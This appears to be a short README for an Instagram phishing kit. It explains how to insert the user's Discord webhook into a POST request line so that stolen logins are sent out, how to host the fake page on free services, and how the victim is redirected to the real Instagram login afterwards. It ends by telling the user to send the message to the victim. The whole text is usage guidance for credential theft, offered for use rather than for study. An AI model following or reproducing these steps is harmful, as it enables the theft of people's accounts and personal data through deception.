Usage :

My Instagram phishing page is really easy to use, you only have to replace WEBHOOK on line 101 by your Discord webhook
request.open("POST", "Webhook");

Next, you upload it to your website (like Netlify or 000webhost, they are free)
When someone will login you will receive his credentials and he will be redirected to the official Insta login page. (the one in the link, you can change it by editing the link and the js part in HTML on line 108).




send this msg directly to the victim.
